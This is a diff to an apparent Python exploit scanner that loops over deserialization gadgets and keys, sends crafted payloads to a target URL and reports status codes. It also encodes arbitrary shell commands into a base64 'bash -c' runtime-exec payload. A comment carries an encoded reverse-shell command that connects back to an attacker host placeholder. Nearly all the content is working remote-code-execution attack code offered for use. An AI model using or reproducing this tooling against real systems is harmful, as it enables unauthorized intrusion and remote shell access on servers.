@@ -79,10 +79,12 @@ GADGETS = (
 )
 
 
-def get_command(command):
+def get_command(command, gadget=None, key=None, flag=''):
+    if (flag != '') and command.find(flag) != -1 and gadget and key:
+        command = command.replace(flag, f'{gadget}{key}')
+
     # command = 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHNfaXAvcG9ydCAwPiYx}|{base64,-d}|{bash,-i}'
     # command encode http://www.jackson-t.ca/runtime-exec-payloads.html
-
     base64_command = str(base64.b64encode(bytes(command, encoding='utf-8')), encoding='utf-8')
     encoded_command = 'bash -c {echo,' + base64_command + '}|{base64,-d}|{bash,-i}'
 
@@ -137,13 +139,10 @@ def scan(url, command, gadget='', key='', flag=''):
 
     for gadget in scan_gadgets:
         for key in scan_keys:
-            if command.find(flag) != -1:
-                new_command = command.replace(flag, f'{gadget}{key}')
-
-            encoded_command = get_command(new_command)
+            encoded_command = get_command(command, gadget, key, flag)
             payload = get_payload(encoded_command, gadget, key)
             res = send_payload(url, payload)
-            print(f'{gadget} {key} {new_command} code: {res.status_code}')
+            print(f'{gadget} {key} code: {res.status_code}')
 
 
 def get_parser():
